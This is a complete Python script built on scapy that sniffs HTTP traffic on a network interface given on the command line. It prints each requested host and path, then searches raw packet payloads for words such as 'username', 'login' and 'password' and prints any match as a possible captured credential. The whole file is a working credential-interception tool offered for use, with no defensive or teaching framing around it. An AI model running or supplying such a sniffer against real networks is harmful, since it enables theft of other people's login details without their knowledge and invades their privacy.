#!/usr/bin/env python

import scapy.all as scapy, argparse
from scapy.layers import http


def get_interface():
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "-i", "--interface", dest="interface", help="Interface to sniff..."
    )
    options = parser.parse_args()
    if not options.interface:
        parser.error("[-] Please specify a Interfaces to sniff, use --help")
    return options.interface


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_longin_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)  # convert to string > python 3
        keywords = ["username", "user", "uname", "login", "password", "pass"]
        for keywords in keywords:
            if keywords in load:
                return load


def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("[+] HTTP Request >> " + url.decode())  # from bytes to string type

        login_info = get_longin_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >" + login_info + "\n\n")


interface = get_interface()
sniff(interface)

